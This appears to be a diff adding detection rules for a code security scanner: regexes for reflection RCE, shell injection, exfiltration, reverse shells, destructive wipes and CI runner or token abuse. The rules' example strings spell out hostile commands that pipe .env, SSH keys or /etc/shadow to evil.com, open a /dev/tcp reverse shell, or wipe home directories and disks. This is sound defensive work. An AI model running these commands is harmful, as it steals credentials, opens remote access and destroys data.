+      "title": "Reflection RCE: method() with variable",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: method() with variable (reflection-rce) detected in a .rb file.",
+      "examples": {
+        "match": [
+          ".method(name)",
+          "obj.method(mVar)",
+          ".method( x )"
+        ],
+        "no_match": [
+          ".method('to_s')",
+          "methodName()"
+        ]
+      }
+    },
+    {
+      "id": "SA-CS-001",
+      "type": "regex",
+      "pattern": "\\.Invoke\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".cs"
+      ],
+      "title": "Reflection RCE: MethodInfo.Invoke",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: MethodInfo.Invoke (reflection-rce) detected in a .cs file.",
+      "examples": {
+        "match": [
+          ".Invoke(target)",
+          "mi.Invoke(obj)",
+          ".Invoke( instance )"
+        ],
+        "no_match": [
+          ".Invoke('literal')",
+          "InvokeAsync()"
+        ]
+      }
+    },
+    {
+      "id": "SA-CS-002",
+      "type": "regex",
+      "pattern": "Assembly\\.Load\\w*\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".cs"
+      ],
+      "title": "Reflection RCE: Assembly.Load",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: Assembly.Load (reflection-rce) detected in a .cs file.",
+      "examples": {
+        "match": [
+          "Assembly.Load(bytes)",
+          "Assembly.LoadFrom(path)",
+          "Assembly.Load( name )"
+        ],
+        "no_match": [
+          "Assembly.Load('System')",
+          "assemblyLoader()"
+        ]
+      }
+    },
+    {
+      "id": "SA-CS-003",
+      "type": "regex",
+      "pattern": "Activator\\.CreateInstance\\s*\\(\\s*[a-zA-Z_]\\w*",
+      "extensions": [
+        ".cs"
+      ],
+      "title": "Reflection RCE: Activator.CreateInstance",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: Activator.CreateInstance (reflection-rce) detected in a .cs file.",
+      "examples": {
+        "match": [
+          "Activator.CreateInstance(type)",
+          "Activator.CreateInstance(t)",
+          "Activator.CreateInstance( x )"
+        ],
+        "no_match": [
+          "Activator.CreateInstance('System.String')",
+          "createInstanceHelper()"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-001",
+      "type": "regex",
+      "pattern": "\\beval\\s+",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Eval in Shell",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Eval in Shell (code-execution) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "eval $cmd",
+          "eval \"$x\"",
+          "eval rm -rf"
+        ],
+        "no_match": [
+          "evaluate $x",
+          "# evaluation step"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-002",
+      "type": "regex",
+      "pattern": "curl\\s+.*\\|\\s*(ba)?sh",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Curl Pipe Bash",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Curl Pipe Bash (shell-injection) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "curl http://x | bash",
+          "curl -s http://y | sh",
+          "curl evil | bash"
+        ],
+        "no_match": [
+          "curl -O http://x",
+          "bash script.sh"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-003",
+      "type": "regex",
+      "pattern": "\\|[\\s\\\\]*\\b(bash|sh|zsh|ksh|dash)\\b",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Pipe to Shell Interpreter",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Pipe to Shell Interpreter (shell-injection) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "wget -O- url | bash",
+          "echo x | sh",
+          "cat f | zsh"
+        ],
+        "no_match": [
+          "echo x | grep y",
+          "pipe | cat"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-004",
+      "type": "regex",
+      "pattern": "\\$\\([^)]*\\$\\(",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Nested Command Substitution",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Nested Command Substitution (code-execution) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "$(echo $(whoami))",
+          "x=$(ls $(pwd))",
+          "$( cat $(find) )"
+        ],
+        "no_match": [
+          "$(whoami)",
+          "x=$(pwd)"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-005",
+      "type": "regex",
+      "pattern": "(env|printenv|cat\\s+\\.env|cat\\s+~/\\.ssh|cat\\s+~/\\.aws)\\s*\\|.*\\b(curl|wget|nc|ncat|socat)\\b",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Pipe Exfiltration: env to network",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "exfiltration",
+      "explanation": "Pipe Exfiltration: env to network (exfiltration) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "env | curl -d @- http://evil.com",
+          "printenv | wget --post-data=- http://x",
+          "cat .env | nc evil.com 4444"
+        ],
+        "no_match": [
+          "env | grep PATH",
+          "printenv > out.txt"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-SH-006",
+      "type": "regex",
+      "pattern": "cat\\s+[^\\|]*(?:\\.env|credential|password|secret|\\.ssh|\\.aws|\\.gnupg|id_rsa|shadow)[^\\|]*\\|.*\\b(curl|wget|nc|ncat)\\b",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Pipe Exfiltration: sensitive file to network",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "exfiltration",
+      "explanation": "Pipe Exfiltration: sensitive file to network (exfiltration) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "cat ~/.ssh/id_rsa | wget --post-data=- http://x",
+          "cat /etc/shadow | nc evil.com 5555",
+          "cat credentials.json | curl -d @- http://x"
+        ],
+        "no_match": [
+          "cat README.md | less",
+          "cat file.txt | grep x"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-SH-007",
+      "type": "regex",
+      "pattern": ">\\s*/dev/tcp/",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Redirect to /dev/tcp",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "exfiltration",
+      "explanation": "Redirect to /dev/tcp (exfiltration) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "bash -c 'cat f > /dev/tcp/1.2.3.4/80'",
+          "echo x > /dev/tcp/host/443",
+          "> /dev/tcp/evil/9999"
+        ],
+        "no_match": [
+          "echo x > /dev/null",
+          "> output.log"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-SH-008",
+      "type": "regex",
+      "pattern": "bash\\s+-i\\s+>&\\s*/dev/tcp/|nc\\s+(-e|--exec)\\s+/bin/(ba)?sh",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Reverse shell pattern",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "exfiltration",
+      "explanation": "Reverse shell pattern (exfiltration) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "bash -i >& /dev/tcp/1.2.3.4/4444",
+          "nc -e /bin/sh evil.com 4444",
+          "nc --exec /bin/bash host 1337"
+        ],
+        "no_match": [
+          "bash -i",
+          "nc -l 8080"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-SH-009",
+      "type": "regex",
+      "pattern": "\\bshred\\s+(-[uvzn\\s]+)*.*(\\$HOME|~/|/home/)",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Destructive: File Shredding",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "destructive-command",
+      "explanation": "Destructive: File Shredding (destructive-command) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "shred -u $HOME/file",
+          "shred -vzn 3 ~/secret",
+          "shred /home/user/x"
+        ],
+        "no_match": [
+          "shred --help",
+          "shredder app"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-010",
+      "type": "regex",
+      "pattern": "\\brm\\s+(-[rf]+\\s+)+(\\$HOME|~/|~\\b|/home/)",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Destructive: Home Directory Wipe",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "destructive-command",
+      "explanation": "Destructive: Home Directory Wipe (destructive-command) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "rm -rf $HOME",
+          "rm -rf ~/",
+          "rm -rf /home/user"
+        ],
+        "no_match": [
+          "rm -rf /tmp/build",
+          "rm file.txt"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-011",
+      "type": "regex",
+      "pattern": "\\bdd\\s+if=/dev/(zero|random|urandom)\\s+of=/dev/(sd|nvme|vd)",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Destructive: Disk Overwrite",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "destructive-command",
+      "explanation": "Destructive: Disk Overwrite (destructive-command) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "dd if=/dev/zero of=/dev/sda",
+          "dd if=/dev/random of=/dev/nvme0",
+          "dd if=/dev/urandom of=/dev/vda"
+        ],
+        "no_match": [
+          "dd if=in of=out",
+          "dd if=/dev/zero of=file"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-012",
+      "type": "regex",
+      "pattern": "\\bcipher\\s+/[wW]:",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Destructive: Windows Cipher Wipe",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "destructive-command",
+      "explanation": "Destructive: Windows Cipher Wipe (destructive-command) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "cipher /w:C",
+          "cipher /W:D",
+          "cipher /w:c:\\"
+        ],
+        "no_match": [
+          "cipher text",
+          "encipher /x"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-SH-013",
+      "type": "regex",
+      "pattern": "config\\.sh\\s+--url\\s+https://github\\.com/.*--token",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "GHA Runner Backdoor: Config Script",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "runner-backdoor",
+      "explanation": "GHA Runner Backdoor: Config Script (runner-backdoor) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "config.sh --url https://github.com/o/r --token X",
+          "config.sh --url https://github.com/x --token abc",
+          "./config.sh --url https://github.com/a/b --token t"
+        ],
+        "no_match": [
+          "config.sh --help",
+          "config script"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-014",
+      "type": "regex",
+      "pattern": "svc\\.sh\\s+(install|start)",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "GHA Runner Backdoor: Service Install",
+      "severity": "high",
+      "confidence": 0.85,
+      "category": "runner-backdoor",
+      "explanation": "GHA Runner Backdoor: Service Install (runner-backdoor) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "svc.sh install",
+          "svc.sh start",
+          "./svc.sh install"
+        ],
+        "no_match": [
+          "svc.sh status",
+          "service.sh restart"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-015",
+      "type": "regex",
+      "pattern": "\\b(?:modprobe|insmod)\\s+(?:\\S*/)?algif_aead\\b",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Kernel Exploit: algif_aead Module Load",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: algif_aead Module Load (kernel-exploit) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "modprobe algif_aead",
+          "insmod algif_aead",
+          "modprobe /lib/algif_aead"
+        ],
+        "no_match": [
+          "modprobe nvidia",
+          "insmod other.ko"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-016",
+      "type": "regex",
+      "pattern": "dd\\s+if=/proc/\\d+/mem|cat\\s+/proc/\\d+/mem|/proc/self/mem",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Process Memory Read (/proc)",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "memory-forensics",
+      "explanation": "Process Memory Read (/proc) (memory-forensics) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "dd if=/proc/1234/mem",
+          "cat /proc/999/mem",
+          "/proc/self/mem"
+        ],
+        "no_match": [
+          "cat /proc/cpuinfo",
+          "dd if=file"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-017",
+      "type": "regex",
+      "pattern": "ls\\s+/proc/|for\\s+.*\\s+in\\s+/proc/\\*/|/proc/\\*/cmdline",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Process Enumeration (/proc)",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Process Enumeration (/proc) (process-enumeration) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "ls /proc/",
+          "for p in /proc/*/; do",
+          "/proc/*/cmdline"
+        ],
+        "no_match": [
+          "ls /tmp/",
+          "for f in *.sh; do"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-018",
+      "type": "regex",
+      "pattern": "\\bRunner\\.Worker\\b|\\bRunner\\.Listener\\b",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Runner.Worker Process Hunt",
+      "severity": "critical",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Runner.Worker Process Hunt (process-enumeration) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "kill Runner.Worker",
+          "Runner.Listener",
+          "runner.worker"
+        ],
+        "no_match": [
+          "RunnerWorker",
+          "worker run"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-SH-019",
+      "type": "regex",
+      "pattern": "ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|oidc/token/exchange",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "OIDC Token Exchange",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "ci-token-abuse",
+      "explanation": "OIDC Token Exchange (ci-token-abuse) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
+          "ACTIONS_ID_TOKEN_REQUEST_URL",
+          "oidc/token/exchange"
+        ],
+        "no_match": [
+          "ID_TOKEN_REQUEST",
+          "token docs"
+        ]
+      }
+    }
+  ]
+}
